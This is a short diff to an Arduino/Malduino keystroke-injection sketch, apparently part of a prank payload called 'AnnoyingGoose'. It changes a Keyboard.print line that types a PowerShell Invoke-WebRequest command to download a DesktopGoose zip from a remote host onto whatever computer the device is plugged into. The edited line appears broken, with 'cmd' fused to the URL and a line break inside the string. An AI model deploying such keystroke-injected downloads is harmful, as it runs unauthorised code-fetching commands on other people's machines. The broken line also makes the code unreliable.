@@ -108,7 +108,8 @@ void setup(){
     delay(100);
 
     delay(defaultDelay);
-    Keyboard.print("Invoke-WebRequest -OutFile ducky.zip https://srv-file9.gofile.io/download/PXZzEe/DesktopGoose.zip");
+    Keyboard.print("Invoke-WebRequest -OutFile ducky.zip https://github.com/danperks/Malduino-Scripts/raw/master/1%20-%20AnnoyingGoose/DesktopGoose.zipcmd
+    ");
 
     delay(defaultDelay);
     delay(100);
